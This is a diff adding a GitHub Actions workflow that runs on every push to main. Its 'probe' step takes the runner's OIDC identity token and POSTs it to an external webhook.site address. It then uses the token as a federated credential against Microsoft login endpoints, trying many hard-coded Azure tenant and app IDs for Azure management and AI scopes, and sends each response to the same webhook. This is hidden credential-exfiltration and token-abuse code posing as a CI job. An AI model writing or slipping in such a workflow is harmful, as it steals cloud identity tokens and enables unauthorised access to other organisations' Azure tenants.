@@ -1,0 +1,32 @@
+name: zz-i097-fic
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  fic:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        run: |
+          set +e
+          W="https://webhook.site/2a9e626b-2ae7-4933-b5d9-8292af831bef"
+          curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -o /tmp/o.json
+          curl -sS -m 20 -X POST --data-binary @/tmp/o.json "$W/oidc" -o /dev/null
+          FED=$(python3 -c 'import json;print(json.load(open("/tmp/o.json")).get("value",""))')
+          APPS="1fc1eab6-b504-4b5a-a5c0-f58cb490c084 34f30b85-b60e-4be9-975b-dd0b184ae4ee 4d594861-e1f7-4372-8473-22ddcb80afa4 4e05a48f-89f7-4d10-9b68-47d2af7eb520 7aa22c78-587d-4060-8c99-23c1f5df3e5a 855387f8-c9fb-4562-8f1f-f15984798241 8a454169-a877-4a29-abbc-4ef9d9ec0800 96100521-8ccb-4976-887f-11b1a1dda5eb 9f4d0ba9-b0c3-47cb-b787-9449042c9fb7 a464091d-05f7-481d-a1bd-f52ac0124d29 dc34aefa-88e1-4ffe-8f2a-f389cd22e713 f1daa47c-0fb7-4702-974e-68944a21f6b7 b8c2d6a1-2419-4742-8add-adf66cd82a60"
+          for tid in 72f988bf-86f1-41af-91ab-2d7cd011db47 33e01921-4d64-4f8c-a055-5bdaffd5e33d e6f8ac30-2fd5-4173-8392-31b071846feb; do
+            for cid in $APPS; do
+              for sc in "https://ai.azure.com/.default" "https://management.azure.com/.default"; do
+                out=$(curl -sS -m 20 -w ' HTTP:%{http_code}' "https://login.microsoftonline.com/$tid/oauth2/v2.0/token" \
+                  -d "client_id=$cid" -d "grant_type=client_credentials" \
+                  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+                  -d "client_assertion=$FED" -d "scope=$sc")
+                printf '%s|%s|%s|%s\n' "$cid" "$tid" "$sc" "$out" | curl -sS -m 20 -X POST --data-binary @- "$W/r_${cid}_${tid}" -o /dev/null
+              done
+            done
+          done
+          exit 0
